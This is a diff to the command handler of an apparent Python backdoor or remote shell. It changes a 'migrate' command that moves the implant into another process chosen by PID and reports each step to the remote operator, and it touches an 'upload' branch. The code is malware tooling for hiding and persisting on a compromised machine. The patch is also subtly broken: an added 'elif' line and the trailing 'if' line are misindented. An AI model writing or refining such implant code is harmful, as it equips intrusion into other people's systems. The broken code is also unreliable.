@@ -101,25 +101,28 @@ def shell(client_socket):
                 break
             elif command.lower().startswith("migrate"):
                 try:
-                    target_process = command.split(' ')[1]
+                    parts = command.split(' ')  # Split the command into parts
+                    if len(parts) != 2:
+                        client_socket.send(b"Error: Invalid migration command format. Use 'migrate <PID>'.\n")
+                        continue
+                    
+                    target_pid = int(parts[1])  # Convert the second part to an integer (PID)
                     current_process = psutil.Process()
                     current_process_id = current_process.pid
                     client_socket.send(f"[*] Running module against {socket.gethostname()}\n".encode('utf-8'))
                     client_socket.send(f"[*] Current server process: {current_process.name()} ({current_process_id})\n".encode('utf-8'))
-                    client_socket.send(f"[*] Migrating to {target_process}...\n".encode('utf-8'))
+                    client_socket.send(f"[*] Migrating to process ID {target_pid}...\n".encode('utf-8'))
+
                     # Attempt to migrate to the target process
-                    for proc in psutil.process_iter(['pid', 'name']):
-                        if proc.info['name'] == target_process:
-                            target_process_id = proc.info['pid']
-                            client_socket.send(f"[*] Migrating into process ID {target_process_id}\n".encode('utf-8'))
-                            migrate_to_process(target_process_id)
-                            client_socket.send(f"[*] New server process: {target_process} ({target_process_id})\n".encode('utf-8'))
-                            break
-                    else:
-                        client_socket.send(f"[*] Target process {target_process} not found.\n".encode('utf-8'))
+                    migrate_to_process(target_pid)
+                    client_socket.send(f"[*] Migration complete. New server process ID: {target_pid}\n".encode('utf-8'))
+                except ValueError:
+                    client_socket.send(b"Error: PID should be an integer.\n")
+                except psutil.NoSuchProcess:
+                    client_socket.send(b"Error: Target process not found.\n")
                 except Exception as e:
                     client_socket.send(f"[*] Migration error: {e}\n".encode('utf-8'))
-            elif command.lower().startswith("upload"):
+             elif command.lower().startswith("upload"):
                 try:
                     parts = command.split(' ')
         if '-d' in parts:
